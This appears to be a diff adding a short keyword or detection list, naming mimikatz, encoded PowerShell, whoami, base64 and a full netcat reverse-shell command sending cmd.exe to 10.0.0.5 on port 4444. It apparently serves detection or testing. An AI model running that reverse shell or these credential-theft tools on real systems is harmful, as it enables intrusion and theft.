@@ -1,0 +1,5 @@
+mimikatz
+powershell -enc attack
+whoami
+nc -e cmd.exe 10.0.0.5 4444
+base64
